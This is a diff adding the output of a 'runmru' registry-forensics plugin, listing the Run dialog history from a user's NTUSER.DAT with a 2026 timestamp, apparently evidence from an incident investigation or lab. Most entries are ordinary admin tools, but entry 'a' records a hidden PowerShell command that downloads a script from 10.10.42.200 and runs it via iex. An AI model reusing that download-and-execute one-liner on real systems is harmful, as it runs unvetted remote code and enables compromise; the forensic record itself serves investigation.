@@ -1,0 +1,16 @@
+Launching runmru v.20200517
+runmru v.20200517
+(NTUSER.DAT) Get contents of user's RunMRU key
+
+RunMRU
+**All values printed in MRUList\MRUListEx order.
+
+Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
+LastWrite Time  2026-04-12 09:40:46Z
+MRUList = afedcb
+  a  powershell -w hidden -c "iwr -useb http://10.10.42.200:8080/x.txt | iex"\1
+  f  cmd\1
+  e  \\FS01\finance\1
+  d  services.msc\1
+  c  control\1
+  b  eventvwr\1
